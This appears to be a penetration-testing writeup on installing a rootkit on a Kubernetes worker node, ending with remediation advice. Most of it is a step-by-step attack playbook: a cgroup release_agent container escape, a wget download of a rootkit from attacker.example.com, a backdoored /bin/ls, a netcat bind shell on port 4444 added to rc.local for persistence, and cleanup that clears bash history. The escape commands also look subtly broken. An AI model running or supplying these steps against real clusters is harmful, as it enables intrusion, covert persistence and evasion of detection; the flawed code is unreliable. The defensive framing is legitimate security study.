# Kubernetes Node-Level Rootkit Installation

## 1. Overview Section

### Attack Vector Description

This vulnerability involves installing a rootkit directly onto a Kubernetes worker node. An attacker who gains initial access to a node (e.g., through a compromised application running on the node, exploiting a vulnerability in the kubelet, or gaining access to node credentials) can elevate their privileges to root and subsequently install a rootkit. This rootkit can then be used to maintain persistence, hide malicious activities, and potentially compromise other nodes in the cluster or steal sensitive data.

### Potential Impact and Consequences

The consequences of a successful rootkit installation on a Kubernetes node are severe:

*   **Complete Node Control:** The attacker gains persistent root access, allowing them to manipulate any process, file, or network traffic on the compromised node.
*   **Lateral Movement:** The rootkit can be used to sniff network traffic, steal credentials, or exploit vulnerabilities in other nodes within the Kubernetes cluster.
*   **Data Exfiltration:** Sensitive data stored on the node or accessible through the node can be exfiltrated.
*   **Denial of Service (DoS):** The attacker can disrupt the node's services or crash the node entirely, impacting application availability.
*   **Container Escape:** The rootkit can aid in container escape techniques.
*   **Cluster-wide Compromise:** The compromised node can be used as a staging point to attack the Kubernetes control plane, leading to a full cluster compromise.

### Risk Level Assessment

**Critical**

The ability to install a rootkit on a node grants the attacker persistent and privileged access to the underlying infrastructure, allowing for widespread damage and potential cluster-wide compromise.

### Technical Explanation of Why This Vulnerability Exists

This vulnerability exists because of the following factors:

*   **Insufficient Node Security Hardening:** Kubernetes nodes are often not sufficiently hardened against attacks. Default configurations may leave unnecessary services running, and overly permissive firewall rules may exist.
*   **Kubelet Vulnerabilities:** The kubelet, the agent running on each node, is a potential attack target. Vulnerabilities in the kubelet can allow an attacker to execute arbitrary code on the node.
*   **Compromised Container/Application:** A vulnerability in a containerized application running on the node can be exploited to gain initial access to the node's filesystem.
*   **Weak Node Credentials:** If the credentials used to access the node (e.g., SSH keys, cloud provider IAM roles) are weak or improperly managed, an attacker can gain access to the node.
*   **Privileged Containers:** Running containers with excessive privileges (e.g., hostNetwork=true, hostPID=true, hostIPC=true) significantly increases the attack surface.
*   **Lack of Runtime Security:** Without proper runtime security tooling (e.g., Falco, Sysdig Inspect), detection of malicious activity like rootkit installation is difficult.

### Prerequisites and Conditions Needed

*   **Initial Access to a Node:** The attacker must first gain some level of access to a Kubernetes worker node. This could be achieved through:
    *   Exploiting a vulnerability in a containerized application running on the node.
    *   Compromising the kubelet service.
    *   Obtaining valid SSH credentials or cloud provider IAM credentials for the node.
    *   Leveraging a vulnerable Custom Resource Definition (CRD) if the tester has cluster access.
*   **Privilege Escalation:** The attacker needs to escalate their privileges to root on the node. This could involve exploiting a kernel vulnerability, a misconfigured sudo setup, or leveraging a privileged container.
*   **Writable Access to System Directories:** The attacker needs write access to system directories like `/usr/bin`, `/usr/sbin`, `/lib`, or `/etc` to install the rootkit.
*   **Ability to Execute Commands:**  The attacker needs to be able to execute commands on the node.
*   **Network Access (Optional):**  Network access is beneficial for downloading rootkit components or communicating with a command-and-control (C2) server.

## 2. Validation and Exploitation Steps Section

### Phase 1: Validation - Achieving Initial Node Access and Privilege Escalation

**Step 1: Obtaining Initial Node Access (Example: Exploiting a Vulnerable Web Application)**

```bash
# Suppose we identified a vulnerable web application running in a container on the node.
# We'll simulate exploiting a Remote Code Execution (RCE) vulnerability.
# This is a placeholder; replace with actual exploit code.

# Send a payload to the vulnerable web application to execute a command on the node.
curl -X POST -d "cmd=whoami" http://vulnerable-app.example.com/rce

# Expected Output: The user running the web application process within the container.
# Example: www-data

# Explanation: This step validates that we can execute commands within the container.
# We are simulating an RCE vulnerability to obtain a shell within the container.
```

**Step 2: Identifying the Kubernetes Node**

```bash
# Execute a command within the container to identify the Kubernetes node the pod is running on.
kubectl exec -it <pod_name> -n <namespace> -- bash -c "hostname -f"

# Expected Output: The hostname of the Kubernetes node.
# Example: worker-node-01.example.com

# Explanation: This command retrieves the fully qualified domain name (FQDN) of the node.  This information is useful for targeted attacks against the specific node.
# Alternative: Check the environment variables within the container for K8S_NODE_NAME.
```

**Step 3: Privilege Escalation within the Container**

```bash
# Attempt to escalate privileges within the container.  This is highly dependent on the container's configuration.
# Common techniques include exploiting SUID binaries, kernel vulnerabilities, or misconfigurations.
# This example demonstrates exploiting a known SUID binary.  Replace with actual exploit.

# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Identify potential SUID binaries that could be exploitable (e.g., 'sudo', 'pkexec')
# Example: /usr/bin/sudo

# Exploit the SUID binary.  This is a placeholder.
# ./sudo_exploit /bin/bash

# Expected Output: A root shell within the container.

# Explanation:  This step attempts to gain root privileges within the container.  If successful, we can now perform actions as root within the container's namespace.
# Alternative:  Explore kernel vulnerabilities if SUID exploitation fails.
```

**Step 4: Identify potential container escape vectors.**

```bash
# From within the container, identify if it's running in privileged mode

if [ -f "/proc/1/mountinfo" ]; then
    grep " / " /proc/1/mountinfo | grep "ro,"
    if [[ $? -ne 0 ]]; then
       echo "Container might have host access"
    fi
fi

# Check if any host paths are mounted into the container
mount | grep hostPath

# Check if the container is running with hostNetwork=true. If so, the container shares the host's network namespace
ip a

# Check for capabilities of the container.  If running with CAP_SYS_ADMIN, potential for escape.
capsh --print
```

**Step 5: Container Escape (If Possible)**

```bash
# Attempt to escape the container to gain access to the host node.
# This is also highly dependent on the container's configuration and potential vulnerabilities.
# This is a placeholder; replace with actual escape technique.  Common techniques involve abusing cgroups, Docker API sockets, or kernel vulnerabilities.

# Example: Attempting a cgroup release_agent escape. (Highly dependent on specific configurations.)
# Note: This requires CAP_SYS_ADMIN.

mkdir /tmp/cgroup_poc
mount -t cgroup -o rd,release_agent=/tmp/cgroup_poc/release_agent cgroup /tmp/cgroup_poc
echo $$ > /tmp/cgroup_poc/tasks
echo '#!/bin/sh' > /tmp/cgroup_poc/release_agent
echo 'chroot /mnt/host /bin/bash' >> /tmp/cgroup_poc/release_agent
chmod a+x /tmp/cgroup_poc/release_agent
mkdir /tmp/cgroup_poc/nested
echo 0 > /tmp/cgroup_poc/nested/notify_on_release
echo 1 > /tmp/cgroup_poc/nested/cgroup.procs

# Expected output: Root shell on the host node.

# Explanation:  This is one example of a container escape technique.  Successful container escape grants the attacker root access to the underlying Kubernetes node.
# Alternative:  Explore Docker API socket escapes or kernel vulnerabilities.
```

**Step 6: (If no container escape is achieved) Gain direct access to the node via SSH or cloud provider API.**

```bash
# Attempt to connect to the node via SSH.  Requires credentials.
ssh user@worker-node-01.example.com

# Attempt to use cloud provider APIs (e.g., AWS, Azure, GCP) to access the node.  Requires appropriate IAM permissions.
# Example: AWS SSM (requires proper IAM role for the attacker's identity)
aws ssm send-command --instance-ids i-xxxxxxxxxxxxxxxxx --document-name AWS-RunShellScript --parameters "commands=[\"whoami\"]" --output text --query "Command.CommandId"
aws ssm get-command-invocation --command-id <command_id> --instance-id i-xxxxxxxxxxxxxxxxx --output text --query "StandardOutputContent"

# Explanation: If a container escape is not possible, the attacker will attempt to gain direct access to the node through other means.
# The attacker might attempt to brute force SSH credentials or use stolen credentials.
# The attacker may also leverage cloud provider APIs if they have sufficient permissions.
```

### Phase 2: Exploitation - Rootkit Installation

**Step 7: Download the Rootkit**

```bash
# Download the rootkit components from a remote server.
# This example uses 'wget', but other tools like 'curl' can be used.
wget http://attacker.example.com/rootkit.tar.gz -O /tmp/rootkit.tar.gz

# Expected Output: Download progress and confirmation of successful download.

# Explanation: This step transfers the rootkit files to the compromised node.  The rootkit can consist of various binaries, libraries, and configuration files.
# Variation: The rootkit could be downloaded directly from a container image registry or uploaded through a file upload vulnerability in a web application running on the node.
```

**Step 8: Extract the Rootkit**

```bash
# Extract the downloaded rootkit archive.
tar -xzvf /tmp/rootkit.tar.gz -C /tmp

# Expected Output: Output showing the extracted files and directories.

# Explanation: This step unpacks the rootkit components into a temporary directory.
```

**Step 9: Install the Rootkit Components**

```bash
# This step involves copying rootkit components to system directories and configuring them to start automatically.
# This example demonstrates installing a basic rootkit that replaces 'ls' with a modified version.

# Replace /bin/ls with a backdoored version.
mv /bin/ls /bin/ls.orig
cp /tmp/rootkit/ls /bin/ls
chmod +x /bin/ls

# Configure a persistence mechanism (e.g., adding a script to /etc/init.d or /etc/rc.local).
# This example adds a simple script to /etc/rc.local.
echo "nc -l -p 4444 -e /bin/bash &" >> /etc/rc.local
chmod +x /etc/rc.local

# Start the backdoor listener

/etc/rc.local

# Expected Output: (For example, if ls is backdoored):  When running the ls command it may not show certain files.
# When a connection is made to port 4444, the attacker should receive a shell.

# Explanation: This step installs the rootkit by replacing system binaries and configuring persistence.
# The specific commands will vary depending on the rootkit's design and the target system.
# Ensure that the new `ls` binary is compiled for the correct architecture.
```

**Step 10: Test the Rootkit**

```bash
# Test the installed rootkit.

# Example: Execute the backdoored 'ls' command.
ls

# Connect to the backdoor listener (from a remote machine).
nc <node_ip> 4444

# Expected Output:  The backdoored `ls` command may hide certain files. The `nc` command should provide a shell on the compromised node.

# Explanation:  This confirms that the rootkit is installed and functioning correctly.
```

**Step 11: Cleanup**

```bash
# Remove any temporary files or traces of the installation.
rm -rf /tmp/rootkit.tar.gz /tmp/rootkit /etc/rc.local # remove rc.local if this was not originally present.

# Clear bash history
history -c
```

### Remediation Recommendations

*   **Node Hardening:** Implement a strong node hardening policy.  Disable unnecessary services, apply security patches promptly, and configure firewalls to restrict network access to only necessary ports.  Use CIS Benchmarks for Kubernetes nodes.
*   **Principle of Least Privilege:**  Grant containers and applications only the minimum necessary privileges. Avoid running containers with excessive capabilities or mounting host paths unless absolutely necessary. Implement Pod Security Policies (PSPs) or Pod Security Admission (PSA) to enforce security constraints.
*   **Runtime Security Monitoring:**  Deploy a runtime security monitoring solution (e.g., Falco, Sysdig Inspect) to detect and alert on suspicious activity, such as rootkit installation attempts.
*   **Image Scanning:** Regularly scan container images for known vulnerabilities using tools like Clair, Anchore, or Trivy.
*   **Network Segmentation:**  Segment the network to limit the blast radius of a successful attack.  Use network policies to restrict communication between pods and nodes.
*   **Regular Auditing:** Conduct regular security audits of your Kubernetes infrastructure to identify and address potential vulnerabilities.
*   **Credential Management:** Implement robust credential management practices. Use strong passwords, rotate credentials regularly, and avoid storing credentials in plaintext. Use Kubernetes Secrets to manage sensitive information.
*   **Kubelet Security:** Secure the kubelet service by enabling authentication and authorization, limiting access to the kubelet API, and keeping the kubelet software up-to-date.
*   **Implement Kubernetes Security Contexts:**  Security contexts are crucial for limiting the privileges and capabilities available to containers. Define them appropriately.
*   **RBAC (Role-Based Access Control):**  Properly configured RBAC can help prevent unauthorized access and privilege escalation. Follow the principle of least privilege when assigning roles.
*   **Monitor Logs:** Aggressively monitor logs from all Kubernetes components (kubelet, api-server, etc) for suspicious behavior.
*   **Implement Admission Controllers:** Use admission controllers like Gatekeeper or Kyverno to enforce security policies on resources being deployed to the cluster.
